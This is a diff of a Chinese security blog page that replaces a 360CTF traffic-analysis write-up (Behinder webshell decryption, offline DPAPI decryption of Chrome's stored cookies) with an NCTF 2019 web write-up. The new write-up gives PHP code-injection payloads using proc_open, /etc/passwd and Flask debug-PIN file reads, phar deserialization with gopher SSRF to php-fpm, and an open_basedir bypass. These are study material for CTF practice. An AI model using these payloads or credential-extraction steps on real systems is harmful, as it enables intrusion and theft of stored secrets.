@@ -96,31 +96,31 @@
 
 
 
-  <meta name="description" content="360CTF复赛 流量分析这个流量分析题目是在之前没有遇到过的做法，所以我并没有找到获取flag的途径，虽然知道解密流量得到传输的数据，但却离正确步骤越来越远。  首先打开流量包选择导出对象查看http流量，发现大多数格式都是一样的，打开前几个流量包看看在第一个流量包中发现了php代码 通过百度这串代码，发现是冰蝎的马，再看了看后面的步骤，就是传递一个aes密钥给服务端，然后把客户端和服务端传送的">
+  <meta name="description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用crea">
 <meta property="og:type" content="article">
-<meta property="og:title" content="3CTF流量分析">
-<meta property="og:url" content="http://yoursite.com/year/11/12/3ctf流量分析/index.html">
+<meta property="og:title" content="2019NCTFweb部分复现">
+<meta property="og:url" content="http://yoursite.com/year/11/29/2019NCTF/index.html">
 <meta property="og:site_name" content="Yiyangqianxixxxx">
-<meta property="og:description" content="360CTF复赛 流量分析这个流量分析题目是在之前没有遇到过的做法，所以我并没有找到获取flag的途径，虽然知道解密流量得到传输的数据，但却离正确步骤越来越远。  首先打开流量包选择导出对象查看http流量，发现大多数格式都是一样的，打开前几个流量包看看在第一个流量包中发现了php代码 通过百度这串代码，发现是冰蝎的马，再看了看后面的步骤，就是传递一个aes密钥给服务端，然后把客户端和服务端传送的">
+<meta property="og:description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用crea">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114111983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114128228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114139660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114151583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114231202.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114453269.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114420930.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114508406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2019110711452061.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114526761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114541741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114557647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107114605559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
-<meta property="og:updated_time" content="2019-11-12T13:50:48.608Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126113715.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126115609.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126121939.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126123205.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128120953.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121139.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121602.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122058.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128104532.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122255.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128123214.png">
+<meta property="og:updated_time" content="2019-11-29T00:28:52.791Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="3CTF流量分析">
-<meta name="twitter:description" content="360CTF复赛 流量分析这个流量分析题目是在之前没有遇到过的做法，所以我并没有找到获取flag的途径，虽然知道解密流量得到传输的数据，但却离正确步骤越来越远。  首先打开流量包选择导出对象查看http流量，发现大多数格式都是一样的，打开前几个流量包看看在第一个流量包中发现了php代码 通过百度这串代码，发现是冰蝎的马，再看了看后面的步骤，就是传递一个aes密钥给服务端，然后把客户端和服务端传送的">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20191107114111983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70">
+<meta name="twitter:title" content="2019NCTFweb部分复现">
+<meta name="twitter:description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用crea">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png">
 
 
 
@@ -128,7 +128,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/year/11/12/3ctf流量分析/">
+  <link rel="canonical" href="http://yoursite.com/year/11/29/2019NCTF/">
 
 
 
@@ -138,7 +138,7 @@
   };
 </script>
 
-  <title>3CTF流量分析 | Yiyangqianxixxxx</title>
+  <title>2019NCTFweb部分复现 | Yiyangqianxixxxx</title>
   
 
 
@@ -374,7 +374,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/year/11/12/3ctf流量分析/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/year/11/29/2019NCTF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yan">
@@ -391,7 +391,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">3CTF流量分析
+          <h1 class="post-title" itemprop="name headline">2019NCTFweb部分复现
 
               
             
@@ -417,7 +417,7 @@
                 
               
 
-              <time title="创建时间：2019-11-12 21:49:40 / 修改时间：21:50:48" itemprop="dateCreated datePublished" datetime="2019-11-12T21:49:40+08:00">2019-11-12</time>
+              <time title="创建时间：2019-11-29 08:28:25 / 修改时间：08:28:52" itemprop="dateCreated datePublished" datetime="2019-11-29T08:28:25+08:00">2019-11-29</time>
             
 
             
@@ -440,8 +440,8 @@
                 </span>
             
                 <span class="post-meta-item-text">评论数：</span>
-                <a href="/year/11/12/3ctf流量分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/year/11/12/3ctf流量分析/" itemprop="commentCount"></span>
+                <a href="/year/11/29/2019NCTF/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/year/11/29/2019NCTF/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -449,7 +449,7 @@
 
           
           
-            <span id="/year/11/12/3ctf流量分析/" class="leancloud_visitors" data-flag-title="3CTF流量分析">
+            <span id="/year/11/29/2019NCTF/" class="leancloud_visitors" data-flag-title="2019NCTFweb部分复现">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
@@ -474,7 +474,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">1.5k</span>
+                <span title="本文字数">2.4k</span>
               
 
               
@@ -488,7 +488,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">1 分钟</span>
+                <span title="阅读时长">2 分钟</span>
               
             </div>
           
@@ -508,20 +508,41 @@
       
 
       
-        <h2 id="360CTF复赛-流量分析"><a href="#360CTF复赛-流量分析" class="headerlink" title="360CTF复赛 流量分析"></a>360CTF复赛 流量分析</h2><p>这个流量分析题目是在之前没有遇到过的做法，所以我并没有找到获取flag的途径，虽然知道解密流量得到传输的数据，但却离正确步骤越来越远。</p>
-<p><img src="https://img-blog.csdnimg.cn/20191107114111983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>首先打开流量包选择导出对象查看http流量，发现大多数格式都是一样的，打开前几个流量包看看<br>在第一个流量包中发现了php代码<br><img src="https://img-blog.csdnimg.cn/20191107114128228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>通过百度这串代码，发现是冰蝎的马，再看了看后面的步骤，就是传递一个aes密钥给服务端，然后把客户端和服务端传送的流量都用这个aes密钥加密，而密钥在流量包中也可以直接看到</p>
-<p><img src="https://img-blog.csdnimg.cn/20191107114139660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>所以可以找几个流量中的数据解密一下看看具体进行了什么操作，我解密了大多数流量发现都是列当前目录下文件的，没有什么作用，然后就找到一个SQLite format 3,发现是一个sqlite数据库文件<br><img src="https://img-blog.csdnimg.cn/20191107114151583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>百度搜索了一下这种文件的打开方式，是使用sqlite database browser<br><img src="https://img-blog.csdnimg.cn/20191107114231202.png" alt="在这里插入图片描述"><br>打开后可以看到flag字段，但value是看不到的，要解密才能看到。</p>
-<p>后来看了wp才了解了这是存储谷歌浏览器账号密码的一个数据库文件，可以通过离线的方式导出密码。需要使用用户登录密码解密master key file 获得master key。再用master key解密DPAPI blob（也就是数据库文件中无法直接查看到的数据内容）。</p>
-<p>所以我们首先要获得DPAPI blob，也就是从数据库文件中提取出我们要的数据的字段内容，可以用下面的这个脚本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from os import getenv</span><br><span class="line">import sqlite3</span><br><span class="line">import binascii</span><br><span class="line">conn = sqlite3.connect(&quot;123.db&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(&apos;SELECT name,value,encrypted_value FROM cookies&apos;)</span><br><span class="line">for result in cursor.fetchall():</span><br><span class="line">    print(binascii.b2a_hex(result[2]))</span><br><span class="line">    f = open(&apos;test.txt&apos;,&apos;wb&apos;)</span><br><span class="line">    f.write(result[2])</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
-<p>然后就是要找到master key file，刚好这题就是在最后一个流量中有这样的一个路径<br><img src="https://img-blog.csdnimg.cn/20191107114453269.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191107114420930.png" alt="在这里插入图片描述"></p>
-<p>响应包中的这一串数据就是master key file的内容，把它复制成一个文件（不要前面的1d4和后面的0）所以现在我们还差最后一步，就是得到解密master key file所需要的登录密码，这是在我比赛时就找到了但不知道有啥用的password.txt的内容。。。。</p>
-<p>第322个流量中的相应包内容提取出来经过aes解密再base64解密得到password<br><img src="https://img-blog.csdnimg.cn/20191107114508406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>最后这些解密所需要的条件我们都已经有了，要用一个工具windows password recovery来解密<br><img src="https://img-blog.csdnimg.cn/2019110711452061.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择Utils -&gt; DPAPI Decoder and Analyser -&gt; Decrypt DPAPI data blob<br><img src="https://img-blog.csdnimg.cn/20191107114526761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置DPAPI blob file为python脚本提取出来的文件<br><img src="https://img-blog.csdnimg.cn/20191107114541741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>master key file设置为刚刚从流量包中复制出来的文件<br><img src="https://img-blog.csdnimg.cn/20191107114557647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>SID就是之前路径中的S-1-5-21-2127750816-4215895028-2373289296-1001<br>password就是p@ssw0rd<br>然后解密<br><img src="https://img-blog.csdnimg.cn/20191107114605559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3loMTAxMzAyNDkwNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p>
-<p>参考文章<br><a href="https://cloud.tencent.com/developer/news/90236" target="_blank" rel="noopener">离线导出谷歌浏览器中保存的密码</a><br><a href="https://www.freebuf.com/articles/web/213905.html" target="_blank" rel="noopener">冰蝎流量分析</a></p>
+        <h3 id="hackbackdoor"><a href="#hackbackdoor" class="headerlink" title="hackbackdoor"></a>hackbackdoor</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png" alt></p>
+<p>题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126113715.png" alt></p>
+<p>但是直接用参数拼接的方法比较容易写错，可以使用create_function创建一个方法，把方法执行的代码内容写在post里，这样比较方便。所以构造url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60004/?code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>post内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=$cmd=&apos;../../.././readflag&apos;;</span><br><span class="line">$descriptorspec=array(array(&apos;pipe&apos;,&apos;r&apos;) ,array(&apos;pipe&apos;,&apos;w&apos;) ,array(&apos;pipe&apos;,&apos;w&apos;)</span><br><span class="line">);</span><br><span class="line">$handle=proc_open($cmd, $descriptorspec, $p);</span><br><span class="line">var_dump(stream_get_contents($p[1]));</span><br><span class="line">proc_close($handle);</span><br></pre></td></tr></table></figure>
+<h3 id="flaskwebsite"><a href="#flaskwebsite" class="headerlink" title="flaskwebsite"></a>flaskwebsite</h3><p>这题的知识点之前没有学习过，是有关于flask debug pin码的安全问题。flask在debug模式下会生成一个debugger pin，通过这个pin码可以在报错页面执行任意python代码。这里有篇文章专门讲解了这方面的问题 <a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">文章链接</a></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126115609.png" alt></p>
+<p>而这个pin码是可以通过搜集机器上的一些信息来生成的，所以配合一个任意文件读取的功能就可以实现代码执行的功能了。所以只要根据文章的内容来提取出需要的信息，就可以构造出题目机器上的pin。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username  #也就是运行当前flask的用户，可以通过etc/passwd来得到</span><br><span class="line"></span><br><span class="line">modname  #flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)) # Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &apos;__file__&apos;, None) # flask目录下的一个app.py的绝对路径</span><br><span class="line"></span><br><span class="line">uuid.getnode() # mac地址十进制/sys/class/net/eth0/address</span><br><span class="line"></span><br><span class="line">get_machine_id() # /etc/machine-id 或 /proc/sys/kernel/random/boot_id</span><br></pre></td></tr></table></figure>
+<p>但这题有一个不一样的点，因为是docker起的服务，所以读机器id没有用，要读docker容器id，通过路径 /proc/self/cgroup来读取</p>
+<p>用脚本跑出来pin然后直接在报错页面执行python代码读文件就行了</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126121939.png" alt></p>
+<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126123205.png" alt></p>
+<p>第一个num可以用%0a绕过,第二个条件只要string1和string2的md5值是以0e开头，并且内容中 包含cxhp四个字母就可以令他们相等了。第三个条件是要传入的参数q_w_q中不能含有’_’或者url编码后的%57，但是下划线 _可以用.代替，所以传入参数q.w.q。</p>
+<h3 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128120953.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121139.png" alt></p>
+<p>根据题目提示vim可以想到有.swp文件泄露，测试发现文件catchmine.php.swp，恢复后文件内容如下</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121357.png" alt></p>
+<p>题目意思很明确，就是curl_exec实现任意文件读取，要触发curl必须先满足careful反序列化后执行函数funny_get()得到1，这个很简单，直接构造</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121602.png" alt></p>
+<p>而Main类要怎么实现反序列化，可以通过getimagesize(phar://文件路径)来触发，所以利用点也就明确了，上传一个phar文件并且类型设置为jpeg或gif，得到上传后的路径填入name中。要任意读取的文件可以通过Main类的url属性来设置。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122058.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128104532.png" alt></p>
+<p>得到一个内网网址10.0.0.3，访问后得到</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122255.png" alt></p>
+<p>提示10.0.0.3由php-fpm，所以可以想到利用ssrf+gopher</p>
+<p><a href="https://evoa.me/index.php/archives/52/#toc-SSRFGopher" target="_blank" rel="noopener">参考链接</a></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128123214.png" alt></p>
+<p>由于这一题的php-fpm在10.0.0.3上，所以要把开头的gopher://127.0.0.1改为gopher://10.0.0.3，而且这题不需要二次url编码。</p>
+<p>后面的内容因为题目环境关了，所以没有截图，只能口诉。</p>
+<p>后面访问phpinfo后会发现禁用了很多函数，而且限制了open_basedir，但是可以绕过，可用php代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(&apos;/tmp/fuck&apos;);chdir(&apos;/tmp/fuck&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(scandir(&apos;/&apos;));readfile(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/YsMnLpUAnOolblXHVfCk8w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YsMnLpUAnOolblXHVfCk8w</a></p>
 
       
     </div>
@@ -552,8 +573,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/year/11/12/123/" rel="next" title="上海市网络安全大赛复现">
-                <i class="fa fa-chevron-left"></i> 上海市网络安全大赛复现
+              <a href="/year/11/27/docker日常使用命令记录/" rel="next" title="docker日常使用命令记录">
+                <i class="fa fa-chevron-left"></i> docker日常使用命令记录
               </a>
             
           </div>
@@ -561,10 +582,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/year/11/27/docker日常使用命令记录/" rel="prev" title="docker日常使用命令记录">
-                docker日常使用命令记录 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -679,7 +696,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#360CTF复赛-流量分析"><span class="nav-number">1.</span> <span class="nav-text">360CTF复赛 流量分析</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#hackbackdoor"><span class="nav-number">1.</span> <span class="nav-text">hackbackdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flaskwebsite"><span class="nav-number">2.</span> <span class="nav-text">flaskwebsite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyphp"><span class="nav-number">3.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar-matches-everything"><span class="nav-number">4.</span> <span class="nav-text">phar matches everything</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">5.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
